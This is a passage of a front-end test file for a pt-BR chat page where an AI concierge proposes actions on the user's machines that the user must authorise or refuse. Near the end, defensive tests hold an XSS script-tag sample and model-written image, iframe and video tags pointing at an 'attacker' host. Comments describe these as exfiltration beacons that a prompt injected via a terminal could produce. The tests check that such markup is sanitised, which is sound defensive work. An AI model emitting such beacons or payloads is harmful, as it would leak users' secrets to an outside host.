// @vitest-environment jsdom
import { act, cleanup, fireEvent, render, screen, waitFor } from '@testing-library/react';
import { MemoryRouter } from 'react-router-dom';
import { afterEach, beforeEach, expect, it, vi } from 'vitest';
import { ChatPage } from './ChatPage';
import type { ChatAction, ChatMessage } from '../lib/types';

const chatMock = vi.fn();
const sendMock = vi.fn();
const streamMock = vi.fn();
const decideMock = vi.fn();
const setHostMock = vi.fn();
const machinesMock = vi.fn();
const accountsMock = vi.fn();

vi.mock('../lib/api', () => {
  // Same signature as the real one: the page shows `message`, so a stand-in that swallows it would
  // make the pt-BR server message untestable.
  class ApiError extends Error {
    constructor(
      public status: number,
      message: string,
      public code?: string,
    ) {
      super(message);
    }
  }
  return {
    ApiError,
    api: {
      chat: (...a: unknown[]) => chatMock(...a),
      sendChatMessage: (...a: unknown[]) => sendMock(...a),
      decideChatAction: (...a: unknown[]) => decideMock(...a),
      setChatHost: (...a: unknown[]) => setHostMock(...a),
      machines: { list: (...a: unknown[]) => machinesMock(...a) },
      aiAccounts: { list: (...a: unknown[]) => accountsMock(...a) },
    },
  };
});
// The chat is the signed-in user's own, whoever an admin may be "viewing as": the page needs that id to
// offer only machines `POST /chat/host` will accept, and needs to know when it is looking at someone
// else's rows. Held in a mutable box so one test can switch the scope without a second mock factory.
const auth = vi.hoisted(() => ({ state: { user: { id: 'u1' }, viewAs: null } as { user: { id: string } | null; viewAs: unknown } }));
vi.mock('../lib/auth', () => ({ useAuth: () => auth.state }));
vi.mock('../lib/chat', () => ({ useChatStream: (...a: unknown[]) => streamMock(...a) }));

const msg = (over: Partial<ChatMessage> & { id: string }): ChatMessage => ({
  conversation_id: 'c1',
  role: 'user',
  text: '',
  error_code: null,
  created_at: '2026-09-21T00:00:00.000Z',
  ...over,
});

const action = (over: Partial<ChatAction> & { id: string }): ChatAction => ({
  tool: 'send_input',
  args: { tab_id: 't1', text: 'npm test' },
  class: 'write',
  status: 'pending',
  machine_id: null,
  project_id: null,
  tab_id: 't1',
  summary: 'digitar `npm test` na aba Terminal 2 do projeto reactivando, no macbook m3',
  created_at: '2026-09-21T00:00:00.000Z',
  ...over,
});

beforeEach(() => {
  chatMock.mockReset();
  sendMock.mockReset();
  streamMock.mockReset();
  decideMock.mockReset();
  setHostMock.mockReset();
  machinesMock.mockReset();
  accountsMock.mockReset();
  accountsMock.mockResolvedValue({ accounts: [] });
  auth.state = { user: { id: 'u1' }, viewAs: null };
  chatMock.mockResolvedValue({ conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null }, messages: [msg({ id: 'm1', role: 'user', text: 'oi' })], actions: [] });
  sendMock.mockResolvedValue({ message: msg({ id: 'm3', role: 'assistant', text: 'pronto' }) });
  streamMock.mockReturnValue({ connected: true });
});

afterEach(() => cleanup());

/** Stubs `matchMedia('(pointer: coarse)')` for one test and hands back a restorer, so a failure
 * partway through a test can never leave `window` different from how this file found it. */
function mockPointer(coarse: boolean): () => void {
  const original = window.matchMedia;
  window.matchMedia = ((query: string) => ({ matches: coarse && query.includes('coarse') })) as typeof window.matchMedia;
  return () => {
    window.matchMedia = original;
  };
}

/** The element that scrolls is the list's parent (`ChatThread`); the list itself keeps the `Conversa` name. */
const findScroller = async () => (await screen.findByRole('list', { name: 'Conversa' })).parentElement as HTMLElement;

it('shows the stored conversation', async () => {
  render(<ChatPage />);
  expect(await screen.findByText('oi')).toBeTruthy();
});

it('sends what was typed and clears the box', async () => {
  render(<ChatPage />);
  const box = await screen.findByPlaceholderText(/pergunte/i);
  fireEvent.change(box, { target: { value: 'o que está rodando?' } });
  fireEvent.click(screen.getByRole('button', { name: /enviar/i }));
  await waitFor(() => expect(sendMock).toHaveBeenCalledWith('o que está rodando?'));
  expect((box as HTMLTextAreaElement).value).toBe('');
});

it('clears the box as soon as the message is sent, not when the answer lands', async () => {
  // The POST only resolves when the whole answer is written, which can take a minute.
  let resolveSend: (v: unknown) => void = () => {};
  sendMock.mockImplementationOnce(() => new Promise((r) => (resolveSend = r)));

  render(<ChatPage />);
  const box = (await screen.findByPlaceholderText(/pergunte/i)) as HTMLTextAreaElement;
  fireEvent.change(box, { target: { value: 'quais máquinas estão online?' } });
  fireEvent.click(screen.getByRole('button', { name: /enviar/i }));

  await waitFor(() => expect(box.value).toBe(''));
  resolveSend({ message: { id: 'm9', role: 'assistant', text: 'pronto', error_code: null } });
});

it('gives the text back when the send fails, so nothing is lost', async () => {
  sendMock.mockRejectedValueOnce(new Error('rede caiu'));

  render(<ChatPage />);
  const box = (await screen.findByPlaceholderText(/pergunte/i)) as HTMLTextAreaElement;
  fireEvent.change(box, { target: { value: 'não perde isso' } });
  fireEvent.click(screen.getByRole('button', { name: /enviar/i }));

  await waitFor(() => expect(box.value).toBe('não perde isso'));
});

it('re-reads the conversation whenever the socket (re)connects', async () => {
  // Review Focus 5: /ws/chat carries no history, so a reconnect mid-answer must refetch.
  streamMock.mockImplementation((onReconnect: () => void) => {
    onReconnect();
    return { connected: true };
  });
  render(<ChatPage />);
  await waitFor(() => expect(chatMock.mock.calls.length).toBeGreaterThanOrEqual(2));
});

it('says when an answer did not finish', async () => {
  chatMock.mockResolvedValueOnce({
    conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
    messages: [msg({ id: 'm1', role: 'assistant', text: 'comecei', error_code: 'RUNNER_FAILED' })],
  });
  render(<ChatPage />);
  expect(await screen.findByText(/não terminou/i)).toBeTruthy();
});

it('drops the delta trail from before a reset, keeping only what streamed after it', async () => {
  // The server retries a run on a fresh CLI session and throws away what streamed before the
  // reset; the bubble must never glue the abandoned half-answer to the real one.
  chatMock.mockResolvedValue({
    conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
    messages: [msg({ id: 'm2', role: 'assistant', text: '' })],
  });
  let deliver: (e: unknown) => void = () => {};
  streamMock.mockImplementation((_onReconnect: () => void, onEvent: (e: unknown) => void) => {
    deliver = onEvent;
    return { connected: true };
  });
  render(<ChatPage />);
  await screen.findByRole('list', { name: 'Conversa' });
  act(() => {
    deliver({ type: 'delta', message_id: 'm2', delta: 'resposta abandonada' });
    deliver({ type: 'reset', message_id: 'm2' });
    deliver({ type: 'delta', message_id: 'm2', delta: 'resposta nova' });
  });
  expect(await screen.findByText('resposta nova')).toBeTruthy();
  expect(screen.queryByText(/resposta abandonada/)).toBeNull();
});

it('does not wait for ever on an empty row left behind by a dead run', async () => {
  // A process death mid-run (every deploy has one) leaves an empty assistant row. Nothing will ever
  // fill it, so it must read as a failure instead of saying "pensando…" for the rest of time.
  chatMock.mockResolvedValue({
    conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
    messages: [msg({ id: 'm1', role: 'user', text: 'oi' }), msg({ id: 'm2', role: 'assistant', text: '' })],
  });
  render(<ChatPage />);
  expect(await screen.findByText(/não terminou/i)).toBeTruthy();
  expect(screen.queryByText(/pensando/i)).toBeNull();
});

it('says "pensando…" while the message it is answering is the live one', async () => {
  chatMock.mockResolvedValue({
    conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
    messages: [msg({ id: 'm1', role: 'user', text: 'oi' }), msg({ id: 'm2', role: 'assistant', text: '' })],
  });
  let deliver: (e: unknown) => void = () => {};
  streamMock.mockImplementation((_onReconnect: () => void, onEvent: (e: unknown) => void) => {
    deliver = onEvent;
    return { connected: true };
  });
  render(<ChatPage />);
  await screen.findByRole('list', { name: 'Conversa' });
  // The run was announced over the socket: this row is being written right now.
  act(() => deliver({ type: 'message', message: msg({ id: 'm2', role: 'assistant', text: '' }) }));
  expect(await screen.findByText(/pensando/i)).toBeTruthy();
  expect(screen.queryByText(/não terminou/i)).toBeNull();
});

it('scrolls the list to the newest message when one arrives', async () => {
  // Past one viewport the user would otherwise send a message and see nothing move.
  let deliver: (e: unknown) => void = () => {};
  streamMock.mockImplementation((_onReconnect: () => void, onEvent: (e: unknown) => void) => {
    deliver = onEvent;
    return { connected: true };
  });
  chatMock
    .mockResolvedValueOnce({ conversation: { id: 'c1' }, messages: [msg({ id: 'm1', role: 'user', text: 'oi' })] })
    .mockResolvedValue({ conversation: { id: 'c1' }, messages: [msg({ id: 'm1', role: 'user', text: 'oi' }), msg({ id: 'm2', role: 'assistant', text: 'pronto' })] });

  render(<ChatPage />);
  const list = await findScroller();
  // jsdom lays nothing out, so the scrollable height is stubbed; what is asserted is that the page
  // pins the list to its bottom on new content.
  Object.defineProperty(list, 'scrollHeight', { value: 480, configurable: true });
  expect(list.scrollTop).toBe(0);

  deliver({ type: 'message', message: msg({ id: 'm2', role: 'assistant', text: 'pronto' }) });
  await waitFor(() => expect(list.scrollTop).toBe(480));
});

it('does not send on Enter with a coarse pointer (a touch keyboard), and keeps the text', async () => {
  const restore = mockPointer(true);
  try {
    render(<ChatPage />);
    const box = (await screen.findByPlaceholderText(/pergunte/i)) as HTMLTextAreaElement;
    fireEvent.change(box, { target: { value: 'oi' } });
    fireEvent.keyDown(box, { key: 'Enter' });
    expect(sendMock).not.toHaveBeenCalled();
    expect(box.value).toBe('oi');
  } finally {
    restore();
  }
});

it('still sends on Enter with a fine pointer, so desktop keeps today\'s behaviour', async () => {
  const restore = mockPointer(false);
  try {
    render(<ChatPage />);
    const box = (await screen.findByPlaceholderText(/pergunte/i)) as HTMLTextAreaElement;
    fireEvent.change(box, { target: { value: 'oi' } });
    fireEvent.keyDown(box, { key: 'Enter' });
    await waitFor(() => expect(sendMock).toHaveBeenCalledWith('oi'));
  } finally {
    restore();
  }
});

it('leaves the scroll position alone once the reader has scrolled away from the bottom', async () => {
  let deliver: (e: unknown) => void = () => {};
  streamMock.mockImplementation((_onReconnect: () => void, onEvent: (e: unknown) => void) => {
    deliver = onEvent;
    return { connected: true };
  });
  chatMock
    .mockResolvedValueOnce({ conversation: { id: 'c1' }, messages: [msg({ id: 'm1', role: 'user', text: 'oi' })] })
    .mockResolvedValue({ conversation: { id: 'c1' }, messages: [msg({ id: 'm1', role: 'user', text: 'oi' }), msg({ id: 'm2', role: 'assistant', text: 'pronto' })] });

  render(<ChatPage />);
  const list = await findScroller();
  // Far from the bottom by isNearBottom's own rule (100 + 200 < 1000 - 48). The scroll event is
  // the only thing that can tell the page the reader moved: nothing here reads live geometry.
  Object.defineProperty(list, 'scrollHeight', { value: 1000, configurable: true });
  Object.defineProperty(list, 'clientHeight', { value: 200, configurable: true });
  Object.defineProperty(list, 'scrollTop', { value: 100, configurable: true, writable: true });
  fireEvent.scroll(list);

  deliver({ type: 'message', message: msg({ id: 'm2', role: 'assistant', text: 'pronto' }) });
  await screen.findByText('pronto');
  expect(list.scrollTop).toBe(100);
});

it('pins the thread to the bottom when a card lands, not only when a message does', async () => {
  let deliver: (e: unknown) => void = () => {};
  // A `confirmation` is nothing to the live fold (its version stays), so nothing but the thread's own
  // contents can make the pin effect run: this is what tells a card apart from a message here.
  streamMock.mockImplementation((_onReconnect: () => void, onEvent: (e: unknown) => void) => {
    deliver = onEvent;
    return { connected: true };
  });
  chatMock.mockResolvedValue({ conversation: { id: 'c1' }, messages: [msg({ id: 'm1', role: 'user', text: 'oi' })], actions: [] });

  render(<ChatPage />);
  const list = await findScroller();
  Object.defineProperty(list, 'scrollHeight', { value: 480, configurable: true });
  expect(list.scrollTop).toBe(0);

  // A `confirmation` adds a card and touches nothing else: no refetch, no new message.
  deliver({ type: 'confirmation', action_id: 'act1', tool: 'send_input', args: { tab_id: 't1', text: 'npm test' }, class: 'write', machine_id: null, project_id: null, tab_id: 't1', summary: 'digitar `npm test` na aba Terminal 2', created_at: '2026-09-21T00:00:05.000Z' });

  await screen.findByRole('button', { name: /autorizar/i });
  await waitFor(() => expect(list.scrollTop).toBe(480));
});

it('says what the screen is for while the conversation is empty', async () => {
  chatMock.mockResolvedValue({ conversation: { id: 'c1' }, messages: [], actions: [] });
  render(<ChatPage />);

  expect(await screen.findByText(/concierge/i)).toBeTruthy();
});

it('says nothing about an empty conversation while the history is still loading', async () => {
  // A long conversation would otherwise open with "peça algo…" over an empty thread until the fetch
  // resolves — and keep it for ever if the fetch fails.
  let resolve: (value: unknown) => void = () => {};
  chatMock.mockReturnValue(new Promise((r) => (resolve = r)));
  render(<ChatPage />);

  await screen.findByRole('list', { name: 'Conversa' });
  expect(screen.queryByText(/concierge/i)).toBeNull();

  resolve({ conversation: { id: 'c1' }, messages: [], actions: [] });
  expect(await screen.findByText(/concierge/i)).toBeTruthy();
});

it('drops that line as soon as the conversation has a message', async () => {
  render(<ChatPage />); // the default fixture has one message

  await screen.findByText('oi');
  expect(screen.queryByText(/concierge/i)).toBeNull();
});

it('returns to the bottom on send, even if the reader had scrolled away', async () => {
  // load() runs again after a successful send: it must resolve a genuinely new list (not the same
  // object `mockResolvedValue` would keep handing back) for React to see `messages` change and the
  // pin effect to run at all.
  chatMock
    .mockResolvedValueOnce({ conversation: { id: 'c1' }, messages: [msg({ id: 'm1', role: 'user', text: 'oi' })] })
    .mockResolvedValue({ conversation: { id: 'c1' }, messages: [msg({ id: 'm1', role: 'user', text: 'oi' }), msg({ id: 'm3', role: 'assistant', text: 'pronto' })] });
  render(<ChatPage />);
  const list = await findScroller();
  Object.defineProperty(list, 'scrollHeight', { value: 480, configurable: true });
  Object.defineProperty(list, 'clientHeight', { value: 200, configurable: true });
  Object.defineProperty(list, 'scrollTop', { value: 50, configurable: true, writable: true });
  fireEvent.scroll(list); // reader scrolled up: the page stops following

  const box = (await screen.findByPlaceholderText(/pergunte/i)) as HTMLTextAreaElement;
  fireEvent.change(box, { target: { value: 'oi' } });
  fireEvent.click(screen.getByRole('button', { name: /enviar/i }));

  await waitFor(() => expect(list.scrollTop).toBe(480));
});

it('re-reads the conversation when sending fails, so no bubble is left waiting', async () => {
  // A 503 (the chat is not configured) deletes the empty assistant row the server had announced.
  const { ApiError } = await import('../lib/api');
  sendMock.mockRejectedValueOnce(new ApiError(503, 'O chat não está configurado neste servidor', 'CONCIERGE_DISABLED'));
  render(<ChatPage />);
  const box = await screen.findByPlaceholderText(/pergunte/i);
  fireEvent.change(box, { target: { value: 'oi' } });
  fireEvent.click(screen.getByRole('button', { name: /enviar/i }));

  expect(await screen.findByText(/não está configurado/i)).toBeTruthy();
  await waitFor(() => expect(chatMock.mock.calls.length).toBeGreaterThanOrEqual(2));
});

it('does not call a tool-only phase a dead run', async () => {
  // A page opened (or a second tab) after the run began never sees the `message` event that
  // announced it, and a tool-only phase can run for tens of seconds with no delta: the failure line
  // beside the tool chips would be a lie about a perfectly healthy run.
  chatMock.mockResolvedValue({
    conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
    messages: [msg({ id: 'm1', role: 'user', text: 'o que está rodando?' }), msg({ id: 'm2', role: 'assistant', text: '' })],
  });
  let deliver: (e: unknown) => void = () => {};
  streamMock.mockImplementation((_onReconnect: () => void, onEvent: (e: unknown) => void) => {
    deliver = onEvent;
    return { connected: true };
  });
  render(<ChatPage />);
  await screen.findByRole('list', { name: 'Conversa' });
  act(() => deliver({ type: 'action', message_id: 'm2', tool: 'list_tabs', tool_use_id: 'tu_1', args: {} }));

  expect(await screen.findByText('list_tabs')).toBeTruthy();
  expect(screen.queryByText(/não terminou/i)).toBeNull();
  expect(screen.getByText(/pensando/i)).toBeTruthy();
});

it('shows a pending action as a sentence about the real world, with Autorizar and Recusar', async () => {
  chatMock.mockResolvedValue({
    conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
    messages: [],
    actions: [action({ id: 'act1' })],
  });
  render(<ChatPage />);

  expect(await screen.findByText('digitar `npm test` na aba Terminal 2 do projeto reactivando, no macbook m3')).toBeTruthy();
  expect(screen.getByRole('button', { name: /autorizar/i })).toBeTruthy();
  expect(screen.getByRole('button', { name: /recusar/i })).toBeTruthy();
});

it('the trail survives a reload: an old denied row and a newer pending one for the same proposal both show, keyed by their own id', async () => {
  // Task 4's gate depends on exactly this: a lapsed denial leaves the old row beside a new pending
  // one, so the page must never assume one row per proposal or per tool.
  chatMock.mockResolvedValue({
    conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
    messages: [],
    actions: [action({ id: 'act0', status: 'denied' }), action({ id: 'act1', status: 'pending' })],
  });
  render(<ChatPage />);

  expect(await screen.findByText(/recusado/i)).toBeTruthy();
  expect(screen.getByRole('button', { name: /autorizar/i })).toBeTruthy(); // the newer question still asks
});

it('a denied action reads as denied, with no buttons', async () => {
  chatMock.mockResolvedValue({
    conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
    messages: [],
    actions: [action({ id: 'act0', status: 'denied' })],
  });
  render(<ChatPage />);

  expect(await screen.findByText(/recusado/i)).toBeTruthy();
  expect(screen.queryByRole('button', { name: /autorizar/i })).toBeNull();
  expect(screen.queryByRole('button', { name: /recusar/i })).toBeNull();
});

it('clicking Autorizar calls the decision endpoint and the buttons go away', async () => {
  chatMock.mockResolvedValue({
    conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
    messages: [],
    actions: [action({ id: 'act1' })],
  });
  // The real endpoint returns the raw decided row, not the enriched card — no `summary` here; the
  // page must keep the card's already-known summary and apply only the new status.
  decideMock.mockResolvedValue({ action: { id: 'act1', status: 'approved' }, message: msg({ id: 'm9', role: 'assistant', text: 'Feito.' }) });
  render(<ChatPage />);

  fireEvent.click(await screen.findByRole('button', { name: /autorizar/i }));

  await waitFor(() => expect(decideMock).toHaveBeenCalledWith('act1', 'approve'));
  await waitFor(() => expect(screen.queryByRole('button', { name: /autorizar/i })).toBeNull());
  expect(screen.queryByRole('button', { name: /recusar/i })).toBeNull();
  expect(await screen.findByText(/autorizado/i)).toBeTruthy();
  // The decision endpoint's response carries no `summary` (that field only ever comes from GET
  // /api/chat or the confirmation event) — the sentence must still be on screen, not dropped.
  expect(screen.getByText('digitar `npm test` na aba Terminal 2 do projeto reactivando, no macbook m3')).toBeTruthy();
});

it('clicking Recusar calls the decision endpoint with the refusal and the buttons go away', async () => {
  chatMock.mockResolvedValue({
    conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
    messages: [],
    actions: [action({ id: 'act1' })],
  });
  decideMock.mockResolvedValue({ action: { id: 'act1', status: 'denied' }, message: msg({ id: 'm9', role: 'assistant', text: 'Ok.' }) });
  render(<ChatPage />);

  fireEvent.click(await screen.findByRole('button', { name: /recusar/i }));

  await waitFor(() => expect(decideMock).toHaveBeenCalledWith('act1', 'deny'));
  expect(await screen.findByText(/recusado/i)).toBeTruthy();
  expect(screen.queryByRole('button', { name: /autorizar/i })).toBeNull();
});

it('shows the server\'s pt-BR note when the decision is queued behind a busy run, not an error', async () => {
  chatMock.mockResolvedValue({
    conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
    messages: [],
    actions: [action({ id: 'act1' })],
  });
  decideMock.mockResolvedValue({
    action: { id: 'act1', status: 'approved' },
    queued: true,
    note: 'A decisão foi registrada e será aplicada assim que a resposta atual do concierge terminar.',
  });
  render(<ChatPage />);

  fireEvent.click(await screen.findByRole('button', { name: /autorizar/i }));

  expect(await screen.findByText(/será aplicada assim que a resposta atual/i)).toBeTruthy();
  expect(screen.queryByText(/não foi possível/i)).toBeNull(); // not treated as a failure
});

it('a confirmation event on the socket adds the question as a card without a refetch', async () => {
  let deliver: (e: unknown) => void = () => {};
  streamMock.mockImplementation((_onReconnect: () => void, onEvent: (e: unknown) => void) => {
    deliver = onEvent;
    return { connected: true };
  });
  render(<ChatPage />);
  await waitFor(() => expect(chatMock).toHaveBeenCalledTimes(1));

  deliver({
    type: 'confirmation',
    action_id: 'act1',
    tool: 'send_input',
    args: { tab_id: 't1', text: 'npm test' },
    class: 'write',
    machine_id: null,
    project_id: null,
    tab_id: 't1',
    summary: 'digitar `npm test` na aba Terminal 2 do projeto reactivando, no macbook m3',
    // The event carries the row's own timestamp — the thread places the card by it.
    created_at: '2026-09-21T00:00:01.000Z',
  });

  expect(await screen.findByText('digitar `npm test` na aba Terminal 2 do projeto reactivando, no macbook m3')).toBeTruthy();
  expect(chatMock).toHaveBeenCalledTimes(1); // no refetch — the event alone carries the card
});

it('a decision event on the socket updates the card by its action id, for a decision made in another tab', async () => {
  let deliver: (e: unknown) => void = () => {};
  streamMock.mockImplementation((_onReconnect: () => void, onEvent: (e: unknown) => void) => {
    deliver = onEvent;
    return { connected: true };
  });
  chatMock.mockResolvedValue({
    conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
    messages: [],
    actions: [action({ id: 'act1' })],
  });
  render(<ChatPage />);
  await screen.findByRole('button', { name: /autorizar/i });

  deliver({ type: 'decision', action_id: 'act1', status: 'denied' });

  await waitFor(() => expect(screen.queryByRole('button', { name: /autorizar/i })).toBeNull());
  expect(await screen.findByText(/recusado/i)).toBeTruthy();
});

it("renders the concierge's answer as Markdown, not as a literal", async () => {
  chatMock.mockResolvedValue({
    conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
    messages: [msg({ id: 'm2', role: 'assistant', text: '**pronto**' })],
  });
  render(<ChatPage />);

  const el = await screen.findByText('pronto');
  expect(el.tagName).toBe('STRONG');
});

it('never parses the user\'s own words as Markdown', async () => {
  chatMock.mockResolvedValue({
    conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
    messages: [msg({ id: 'm1', role: 'user', text: '**oi**' })],
  });
  render(<ChatPage />);

  // What the user typed is what the user sees: no bold, and the asterisks are still there.
  expect(await screen.findByText('**oi**')).toBeTruthy();
  expect(document.querySelector('strong')).toBeNull();
});

it('sanitises the answer: a script tag in the model text never becomes a script element', async () => {
  // The concierge reads real terminal screens, so its text can carry anything a prompt injected
  // into a terminal produced.
  chatMock.mockResolvedValue({
    conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
    messages: [msg({ id: 'm2', role: 'assistant', text: 'olha isso <script>alert(1)</script>' })],
  });
  render(<ChatPage />);

  await screen.findByText(/olha isso/);
  expect(document.querySelector('script')).toBeNull();
});

it('fetches nothing from an answer: no element in the model text can make the browser issue a GET', async () => {
  // No CSP in this repo, so any remote URL the model wrote would be fetched on render — an
  // exfiltration beacon whose query string the model chooses. `img` was only the obvious one.
  chatMock.mockResolvedValue({
    conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
    messages: [
      msg({
        id: 'm2',
        role: 'assistant',
        text: 'olha isso ![](https://attacker/?d=segredo)\n\n<img src="https://attacker/?d=raw">\n\n<video poster="https://attacker/?d=poster"></video>\n\n<input type="image" src="https://attacker/?d=input">\n\n<iframe src="https://attacker/?d=frame"></iframe>',
      }),
    ],
  });
  render(<ChatPage />);

  await screen.findByText(/olha isso/);
  // The whole document for everything this page never draws itself — the error paragraphs today, a
  // streaming preview or a conversation title tomorrow, all outside the thread and all able to fetch.
  // The composer's own hidden file picker is the one `input` that cannot fetch anything.
  expect(document.querySelectorAll('video, input:not([type="file"]), iframe, image')).toHaveLength(0);
  // `img` and `svg` are scoped to the thread, which is where the model's text lands: the page's own
  // chrome legitimately draws inline SVG (the composer's send/mic and paperclip glyphs) and an `img`
  // (an image chip's thumbnail in the composer, a sent image's thumbnail in a user bubble — both the
  // page's own, same-origin), and none of that is model markup. This conversation sends no image.
  const thread = screen.getByRole('list', { name: 'Conversa' });
  expect(thread.querySelectorAll('img, svg')).toHaveLength(0);
});

it('puts a card between the two messages it was proposed between', async () => {
  chatMock.mockResolvedValue({
    conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
    messages: [
      msg({ id: 'm1', role: 'user', text: 'roda o teste', created_at: '2026-09-21T00:00:00.000Z' }),
      // The answer carries a Markdown bullet list of its own, which renders as a real `ul` nested in
      // the thread: the thread is found by its name and read by its direct children, so the answer's
      // own list is never mistaken for a second thread nor for a turn of the conversation.
      msg({ id: 'm2', role: 'assistant', text: 'feito:\n\n- um\n- dois', created_at: '2026-09-21T00:00:02.000Z' }),
    ],
    actions: [action({ id: 'act1', created_at: '2026-09-21T00:00:01.000Z' })],
  });
  render(<ChatPage />);
  await screen.findByRole('button', { name: /autorizar/i });

  const thread = screen.getByRole('list', { name: 'Conversa' });
  const items = Array.from(thread.children).map((li) => li.textContent ?? '');
  expect(items).toHaveLength(3);
  expect(items[0]).toContain('roda o teste');
  expect(items[1]).toContain('digitar `npm test`');
  expect(items[2]).toContain('feito');
  expect(thread.querySelector('ul')).toBeTruthy(); // the fixture's bullets really are on screen
});

it('stretches to its region instead of asking for a percentage of it', async () => {
  // Safari does not resolve `height: 100%` against a flex item that has no explicit height, so a
  // column asking for it collapsed to its content: the thread stopped filling the screen, the box
  // floated above a slab of empty space, and the document became the thing that scrolled. jsdom
  // lays nothing out, so the class is what can be pinned — the symptom only shows on a device.
  render(<ChatPage />);
  const thread = await screen.findByRole('list', { name: 'Conversa' });
  // The page's reading column (`ChatPanel`), capped at its measure; the thread's own wrappers sit inside it.
  const column = thread.closest('.max-w-3xl');
  expect(column?.className).toContain('flex-1');
  expect(column?.className).not.toContain('h-full');
});

it('does not hand its scroll to the document when the thread reaches its end', async () => {
  // Without `overscroll-contain` the thread chains its scroll to the page: on a phone the whole
  // document rubber-bands past the end of the conversation, which reads as a screen that scrolls
  // for ever under the one you are reading. jsdom does not scroll, so the class is what can be
  // pinned; the behaviour itself only shows on a device.
  render(<ChatPage />);
  const scroller = await findScroller();
  expect(scroller.className).toContain('overscroll-contain');
});

it('cannot be widened past the viewport by an unbreakable token in an answer', async () => {
  // A flex item's automatic minimum size is its min-content width, and `break-words` does not
  // reduce that — so without `min-w-0` one backticked `waiting_permission` in an answer stretched
  // the whole column and pushed the send button off a phone screen. jsdom lays nothing out, so the
  // class is what can be asserted here; the geometry itself only shows on a real device.
  chatMock.mockResolvedValue({
    conversation: { id: 'c1' },
    messages: [msg({ id: 'm1', role: 'assistant', text: 'a aba está em `waiting_permission` agora' })],
    actions: [],
  });
  render(<ChatPage />);

  const thread = await screen.findByRole('list', { name: 'Conversa' });
  expect(thread.className).toContain('min-w-0');
  expect(thread.parentElement?.className).toContain('min-w-0');
  // Nothing is asserted about the composer any more: its textarea stopped being the flex item of a
  // row and is now a block filling the rounded box, and that box is a stretched item of a *column*
  // flex container, where the automatic minimum size acts on the vertical axis. So the composer's own
  // horizontal guard is not observable in jsdom — only a real device shows it.
});

it('is one single thread, not a message list with a card list glued below it', async () => {
  chatMock.mockResolvedValue({
    conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
    messages: [
      msg({ id: 'm1', role: 'user', text: 'roda o teste', created_at: '2026-09-21T00:00:00.000Z' }),
      // Bullets in the answer again: what this pins is one *thread*, not one list element in the
      // document — a rendered answer is free to contain as many lists as the model wrote.
      msg({ id: 'm2', role: 'assistant', text: 'feito:\n\n- um\n- dois', created_at: '2026-09-21T00:00:02.000Z' }),
    ],
    actions: [action({ id: 'act1', created_at: '2026-09-21T00:00:01.000Z' })],
  });
  render(<ChatPage />);
  await screen.findByRole('button', { name: /autorizar/i });

  expect(screen.getAllByRole('list', { name: 'Conversa' })).toHaveLength(1);
  // …and the fixture does put a second, unnamed list on the page, so the assertion above is scoped
  // work and not a restatement of "there is only one list".
  expect(screen.getAllByRole('list').length).toBeGreaterThan(1);

  // The two assertions above both survive a second, *unlabelled* list of cards glued below the
  // thread — exactly the layout this test exists to forbid. So: every card is a row of the named
  // thread itself, wherever else a list may appear on the page.
  const thread = screen.getByRole('list', { name: 'Conversa' });
  const cards = screen.getAllByRole('button', { name: /autorizar/i });
  expect(cards).toHaveLength(1); // the fixture's one pending card really is on screen
  for (const button of cards) {
    const row = button.closest('li');
    expect(row).not.toBeNull();
    expect(row?.parentElement).toBe(thread);
  }
});

it('renders a streamed delta as Markdown too, while it is still being written', async () => {
  chatMock.mockResolvedValue({
    conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
    messages: [msg({ id: 'm2', role: 'assistant', text: '' })],
  });
  let deliver: (e: unknown) => void = () => {};
  streamMock.mockImplementation((_onReconnect: () => void, onEvent: (e: unknown) => void) => {
    deliver = onEvent;
    return { connected: true };
  });
  render(<ChatPage />);
  await screen.findByRole('list', { name: 'Conversa' });
  act(() => deliver({ type: 'delta', message_id: 'm2', delta: '**parcial**' }));

  const el = await screen.findByText('parcial');
  expect(el.tagName).toBe('STRONG');
});

// ─── The host: which machine is thinking, and what to do when none can ───────────────────────────

/** The page renders a `Link` for the enrol path, so the host tests need a router around it. */
const renderChat = () => render(<ChatPage />, { wrapper: MemoryRouter });

const conversationWith = (host: unknown, over: Record<string, unknown> = {}) => ({
  conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
  messages: [],
  actions: [],
  host,
  ...over,
});

it('with no machine of their own, says so and stops the composer with that as the reason', async () => {
  chatMock.mockResolvedValue(conversationWith({ kind: 'no_machine' }));
  renderChat();

  expect(await screen.findByText(/roda em uma máquina sua/i)).toBeTruthy();
  expect(screen.getByRole('link', { name: /cadastrar máquina/i })).toBeTruthy();
  // And it stops inviting a message it cannot run: the empty-conversation line would contradict the card.
  expect(screen.queryByText(/peça algo às suas máquinas/i)).toBeNull();
  // Nothing pretends to work: the button refuses, and says why instead of going grey in silence.
  const box = screen.getByPlaceholderText(/pergunte/i);
  fireEvent.change(box, { target: { value: 'o que está rodando?' } });
  expect((screen.getByRole('button', { name: /enviar/i }) as HTMLButtonElement).disabled).toBe(true);
  expect(screen.getByText(/cadastre uma máquina para conversar/i)).toBeTruthy();
  fireEvent.click(screen.getByRole('button', { name: /enviar/i }));
  expect(sendMock).not.toHaveBeenCalled();
});

it('picking one of the machines sets the host and re-reads the conversation', async () => {
  const ready = { kind: 'ready', machine: { id: 'm2', name: 'jarvis' }, configDir: null, account: { kind: 'default' } };
